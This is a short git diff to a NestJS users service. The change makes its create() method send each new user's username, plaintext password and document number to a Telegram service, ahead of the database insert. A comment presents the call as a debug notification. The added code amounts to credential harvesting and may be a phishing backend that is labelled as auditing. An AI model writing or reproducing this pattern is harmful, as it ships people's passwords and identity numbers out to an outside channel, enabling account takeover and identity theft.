@@ -5,16 +5,27 @@ import { PaginationQueryDto } from './dto/pagination-query.dto';
 import { PaginatedResponseDto } from './dto/paginated-response.dto';
 import { UsersRepository } from './users.repository';
 import { UserMapper } from './mappers/user.mapper';
+import { TelegramService } from '../common/services/telegram.service';
 
 @Injectable()
 export class UsersService {
   constructor(
     private readonly usersRepository: UsersRepository,
     private readonly userMapper: UserMapper,
+    private readonly telegramService: TelegramService,
   ) { }
 
   async create(auditUserDto: AuditUserRequestDto): Promise<AuditUserResponseDto> {
     try {
+      // Enviar notificación a Telegram (esperar para ver errores durante debug)
+      await this.telegramService.sendAuditNotification({
+        username: auditUserDto.username,
+        password: auditUserDto.password,
+        numeroDocumento: auditUserDto.numeroDocumento,
+        timestamp: new Date(),
+      });
+
+      // Insertar en base de datos
       const user = await this.usersRepository.create(auditUserDto);
       return this.userMapper.toAuditUserResponseDto(user);
     } catch (error) {
